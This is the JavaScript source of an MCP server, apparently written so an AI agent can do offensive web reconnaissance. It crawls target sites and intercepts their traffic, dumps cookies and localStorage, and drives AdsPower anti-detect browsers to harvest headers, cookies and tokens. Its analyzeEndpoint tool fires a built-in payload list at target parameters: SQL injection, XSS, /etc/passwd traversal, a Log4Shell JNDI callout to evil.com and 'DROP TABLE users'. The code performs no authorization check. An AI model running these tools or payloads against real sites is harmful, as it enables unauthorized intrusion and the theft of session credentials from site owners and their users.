#!/usr/bin/env node
/**
 * MCP Endpoint Recon Server
 * By Joyce 👑😈 - For devastating endpoint discovery
 */

import { Server } from '@modelcontextprotocol/sdk/server/index.js';
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';
import { CallToolRequestSchema, ListToolsRequestSchema } from '@modelcontextprotocol/sdk/types.js';
import { chromium } from 'playwright';
import * as cheerio from 'cheerio';
import fetch from 'node-fetch';

class EndpointReconServer {
  constructor() {
    this.server = new Server(
      {
        name: 'mcp-endpoint-recon',
        version: '1.0.0',
      },
      {
        capabilities: {
          tools: {},
        },
      }
    );

    this.setupToolHandlers();
  }

  setupToolHandlers() {
    this.server.setRequestHandler(ListToolsRequestSchema, async () => ({
      tools: [
        {
          name: 'discover_endpoints',
          description: 'Discover all endpoints on a website with network interception',
          inputSchema: {
            type: 'object',
            properties: {
              url: {
                type: 'string',
                description: 'Target website URL',
              },
              depth: {
                type: 'number',
                description: 'Crawl depth (default: 2)',
                default: 2,
              },
              capturePayloads: {
                type: 'boolean',
                description: 'Capture request/response payloads',
                default: true,
              },
            },
            required: ['url'],
          },
        },
        {
          name: 'analyze_endpoint',
          description: 'Deep analysis of a specific endpoint with payload fuzzing',
          inputSchema: {
            type: 'object',
            properties: {
              url: {
                type: 'string',
                description: 'Endpoint URL',
              },
              method: {
                type: 'string',
                description: 'HTTP method',
                enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
                default: 'GET',
              },
              fuzz: {
                type: 'boolean',
                description: 'Fuzz parameters with test payloads',
                default: true,
              },
            },
            required: ['url'],
          },
        },
        {
          name: 'capture_preview',
          description: 'Capture visual preview of endpoint responses',
          inputSchema: {
            type: 'object',
            properties: {
              url: {
                type: 'string',
                description: 'URL to capture',
              },
              fullPage: {
                type: 'boolean',
                description: 'Capture full page screenshot',
                default: true,
              },
            },
            required: ['url'],
          },
        },
        {
          name: 'adspower_capture_everything',
          description: 'Capture EVERYTHING from AdsPower browser - headers, cookies, tokens, payloads, preview data. Outputs clean endpoints.md file',
          inputSchema: {
            type: 'object',
            properties: {
              adspowerPort: {
                type: 'string',
                description: 'AdsPower debug port (e.g., 63812)',
              },
              targetUrl: {
                type: 'string',
                description: 'Target URL to capture endpoints from',
              },
              duration: {
                type: 'number',
                description: 'Duration in seconds to capture (default: 30)',
                default: 30,
              },
            },
            required: ['adspowerPort', 'targetUrl'],
          },
        },
        {
          name: 'adspower_comprehensive_commander',
          description: 'Advanced capture with automatic navigation - discovers pages through API responses and clicks all buttons. Captures EVERYTHING + navigates automatically',
          inputSchema: {
            type: 'object',
            properties: {
              adspowerPort: {
                type: 'string',
                description: 'AdsPower debug port (e.g., 63812)',
              },
              targetUrl: {
                type: 'string',
                description: 'Target URL to start capture from',
              },
              duration: {
                type: 'number',
                description: 'Duration in seconds to capture and navigate (default: 60)',
                default: 60,
              },
            },
            required: ['adspowerPort', 'targetUrl'],
          },
        },
      ],
    }));

    this.server.setRequestHandler(CallToolRequestSchema, async (request) => {
      const { name, arguments: args } = request.params;

      switch (name) {
        case 'discover_endpoints':
          return await this.discoverEndpoints(args);
        case 'analyze_endpoint':
          return await this.analyzeEndpoint(args);
        case 'capture_preview':
          return await this.capturePreview(args);
        case 'adspower_capture_everything':
          return await this.adspowerCaptureEverything(args);
        case 'adspower_comprehensive_commander':
          return await this.adspowerComprehensiveCommander(args);
        default:
          throw new Error(`Unknown tool: ${name}`);
      }
    });
  }

  async discoverEndpoints({ url, depth = 2, capturePayloads = true }) {
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    });

    const endpoints = new Map();
    const visitedUrls = new Set();
    
    // Network interception
    context.on('request', request => {
      const reqUrl = request.url();
      const method = request.method();
      
      if (!endpoints.has(reqUrl)) {
        endpoints.set(reqUrl, {
          url: reqUrl,
          method: method,
          headers: request.headers(),
          payloads: [],
          responses: [],
        });
      }

      if (capturePayloads && request.postData()) {
        endpoints.get(reqUrl).payloads.push({
          timestamp: new Date().toISOString(),
          data: request.postData(),
          contentType: request.headers()['content-type'],
        });
      }
    });

    context.on('response', response => {
      const respUrl = response.url();
      if (endpoints.has(respUrl)) {
        endpoints.get(respUrl).responses.push({
          status: response.status(),
          headers: response.headers(),
          timestamp: new Date().toISOString(),
        });
      }
    });

    // Crawl function
    const crawl = async (pageUrl, currentDepth) => {
      if (currentDepth > depth || visitedUrls.has(pageUrl)) return;
      visitedUrls.add(pageUrl);

      try {
        const page = await context.newPage();
        await page.goto(pageUrl, { waitUntil: 'networkidle', timeout: 30000 });

        // Extract links for further crawling
        if (currentDepth < depth) {
          const links = await page.evaluate(() => {
            return Array.from(document.querySelectorAll('a[href]'))
              .map(a => a.href)
              .filter(href => href.startsWith('http'));
          });

          for (const link of links) {
            if (link.startsWith(new URL(url).origin)) {
              await crawl(link, currentDepth + 1);
            }
          }
        }

        await page.close();
      } catch (error) {
        console.error(`Error crawling ${pageUrl}: ${error.message}`);
      }
    };

    // Start crawling
    await crawl(url, 0);
    await browser.close();

    // Process results
    const discoveredEndpoints = Array.from(endpoints.values()).map(endpoint => ({
      ...endpoint,
      parameterCount: this.extractParameters(endpoint.url).length,
      parameters: this.extractParameters(endpoint.url),
      isAPI: this.isAPIEndpoint(endpoint.url),
      contentTypes: [...new Set(endpoint.payloads.map(p => p.contentType))],
    }));

    return {
      content: [
        {
          type: 'text',
          text: JSON.stringify({
            summary: {
              totalEndpoints: discoveredEndpoints.length,
              apiEndpoints: discoveredEndpoints.filter(e => e.isAPI).length,
              endpointsWithPayloads: discoveredEndpoints.filter(e => e.payloads.length > 0).length,
              uniqueMethods: [...new Set(discoveredEndpoints.map(e => e.method))],
            },
            endpoints: discoveredEndpoints,
          }, null, 2),
        },
      ],
    };
  }

  async analyzeEndpoint({ url, method = 'GET', fuzz = true }) {
    const results = {
      url,
      method,
      parameters: this.extractParameters(url),
      fuzzResults: [],
      responses: [],
    };

    // Base request
    try {
      const response = await fetch(url, { method });
      results.responses.push({
        status: response.status,
        headers: Object.fromEntries(response.headers),
        contentLength: response.headers.get('content-length'),
        contentType: response.headers.get('content-type'),
      });
    } catch (error) {
      results.error = error.message;
    }

    // Fuzzing
    if (fuzz && results.parameters.length > 0) {
      const fuzzPayloads = [
        "' OR '1'='1",
        '"><script>alert(1)</script>',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '%00',
        '{{7*7}}',
        '<img src=x onerror=alert(1)>',
        'admin',
        '1; DROP TABLE users--',
      ];

      for (const param of results.parameters) {
        for (const payload of fuzzPayloads) {
          const fuzzedUrl = url.replace(
            new RegExp(`${param}=[^&]*`),
            `${param}=${encodeURIComponent(payload)}`
          );

          try {
            const response = await fetch(fuzzedUrl, { method });
            results.fuzzResults.push({
              parameter: param,
              payload,
              status: response.status,
              lengthDiff: response.headers.get('content-length') - results.responses[0]?.contentLength,
              interesting: response.status !== results.responses[0]?.status,
            });
          } catch (error) {
            results.fuzzResults.push({
              parameter: param,
              payload,
              error: error.message,
            });
          }
        }
      }
    }

    return {
      content: [
        {
          type: 'text',
          text: JSON.stringify(results, null, 2),
        },
      ],
    };
  }

  async capturePreview({ url, fullPage = true }) {
    const browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();
    
    try {
      await page.goto(url, { waitUntil: 'networkidle' });
      
      const screenshot = await page.screenshot({
        fullPage,
        type: 'png',
      });

      const pageInfo = {
        title: await page.title(),
        url: page.url(),
        viewport: await page.viewportSize(),
        cookies: await page.context().cookies(),
        localStorage: await page.evaluate(() => {
          const items = {};
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            items[key] = localStorage.getItem(key);
          }
          return items;
        }),
      };

      await browser.close();

      return {
        content: [
          {
            type: 'text',
            text: JSON.stringify({
              ...pageInfo,
              screenshotBase64: screenshot.toString('base64'),
            }, null, 2),
          },
        ],
      };
    } catch (error) {
      await browser.close();
      throw error;
    }
  }

  async adspowerCaptureEverything({ adspowerPort, targetUrl, duration = 30 }) {
    const { spawn } = await import('child_process');
    const path = await import('path');
    const { fileURLToPath } = await import('url');
    const fs = await import('fs/promises');
    
    const __filename = fileURLToPath(import.meta.url);
    const __dirname = path.dirname(__filename);
    
    // Path to capture-everything-recon.js
    const scriptPath = path.join(__dirname, 'capture-everything-recon.js');
    
    console.log(`🎯 Launching capture on AdsPower port ${adspowerPort}...`);
    
    return new Promise((resolve, reject) => {
      const process = spawn('node', [scriptPath, adspowerPort, targetUrl, duration.toString()], {
        cwd: __dirname,
      });
      
      let output = '';
      let errorOutput = '';
      
      process.stdout.on('data', (data) => {
        const text = data.toString();
        output += text;
        console.log(text);
      });
      
      process.stderr.on('data', (data) => {
        const text = data.toString();
        errorOutput += text;
        console.error(text);
      });
      
      process.on('close', async (code) => {
        if (code !== 0) {
          reject(new Error(`Process exited with code ${code}: ${errorOutput}`));
          return;
        }
        
        try {
          // Find the generated endpoints.md file
          const domain = new URL(targetUrl).hostname.replace(/\./g, '-');
          const mdFile = path.join(__dirname, `endpoints-${domain}.md`);
          const jsonFile = path.join(__dirname, `endpoints-${domain}.json`);
          
          // Read the generated files
          const mdContent = await fs.readFile(mdFile, 'utf-8');
          const jsonContent = await fs.readFile(jsonFile, 'utf-8');
          
          resolve({
            content: [
              {
                type: 'text',
                text: JSON.stringify({
                  success: true,
                  message: '✅ Capture complete! Headers, cookies, tokens, payloads, and preview data captured.',
                  markdownFile: mdFile,
                  jsonFile: jsonFile,
                  summary: {
                    domain: domain,
                    endpointsCaptured: JSON.parse(jsonContent).endpoints ? Object.keys(JSON.parse(jsonContent).endpoints).length : 0,
                    output: output,
                  },
                  markdownPreview: mdContent.substring(0, 2000) + '...',
                }, null, 2),
              },
            ],
          });
        } catch (error) {
          reject(error);
        }
      });
      
      process.on('error', (error) => {
        reject(error);
      });
    });
  }

  async adspowerComprehensiveCommander({ adspowerPort, targetUrl, duration = 60 }) {
    const { spawn } = await import('child_process');
    const path = await import('path');
    const { fileURLToPath } = await import('url');
    const fs = await import('fs/promises');
    
    const __filename = fileURLToPath(import.meta.url);
    const __dirname = path.dirname(__filename);
    
    // Path to comprehensive-capture-commander.js
    const scriptPath = path.join(__dirname, 'comprehensive-capture-commander.js');
    
    console.log(`🎯 Launching comprehensive capture with navigation on AdsPower port ${adspowerPort}...`);
    
    return new Promise((resolve, reject) => {
      const process = spawn('node', [scriptPath, adspowerPort, targetUrl, duration.toString()], {
        cwd: __dirname,
      });
      
      let output = '';
      let errorOutput = '';
      
      process.stdout.on('data', (data) => {
        const text = data.toString();
        output += text;
        console.log(text);
      });
      
      process.stderr.on('data', (data) => {
        const text = data.toString();
        errorOutput += text;
        console.error(text);
      });
      
      process.on('close', async (code) => {
        if (code !== 0) {
          reject(new Error(`Process exited with code ${code}: ${errorOutput}`));
          return;
        }
        
        try {
          // Find the generated endpoints.md file
          const domain = new URL(targetUrl).hostname.replace(/\./g, '-');
          const mdFile = path.join(__dirname, `endpoints-${domain}.md`);
          const jsonFile = path.join(__dirname, `endpoints-${domain}.json`);
          
          // Read the generated files
          const mdContent = await fs.readFile(mdFile, 'utf-8');
          const jsonContent = await fs.readFile(jsonFile, 'utf-8');
          
          const parsedJson = JSON.parse(jsonContent);
          
          resolve({
            content: [
              {
                type: 'text',
                text: JSON.stringify({
                  success: true,
                  message: '✅ Comprehensive capture complete! All endpoints, pages, headers, tokens, and data captured with automatic navigation.',
                  markdownFile: mdFile,
                  jsonFile: jsonFile,
                  summary: {
                    domain: domain,
                    endpointsCaptured: parsedJson.endpoints ? Object.keys(parsedJson.endpoints).length : 0,
                    pagesDiscovered: parsedJson.discoveredPages ? parsedJson.discoveredPages.length : 0,
                    endpointToPageMappings: parsedJson.endpointToPages ? Object.keys(parsedJson.endpointToPages).length : 0,
                    output: output,
                  },
                  markdownPreview: mdContent.substring(0, 2000) + '...',
                }, null, 2),
              },
            ],
          });
        } catch (error) {
          reject(error);
        }
      });
      
      process.on('error', (error) => {
        reject(error);
      });
    });
  }

  extractParameters(url) {
    try {
      const urlObj = new URL(url);
      return Array.from(urlObj.searchParams.keys());
    } catch {
      return [];
    }
  }

  isAPIEndpoint(url) {
    const apiPatterns = ['/api/', '/v1/', '/v2/', '/graphql', '.json', '/rest/'];
    return apiPatterns.some(pattern => url.includes(pattern));
  }

  async run() {
    const transport = new StdioServerTransport();
    await this.server.connect(transport);
    console.error('MCP Endpoint Recon Server running... 👑😈');
  }
}

const server = new EndpointReconServer();
server.run().catch(console.error);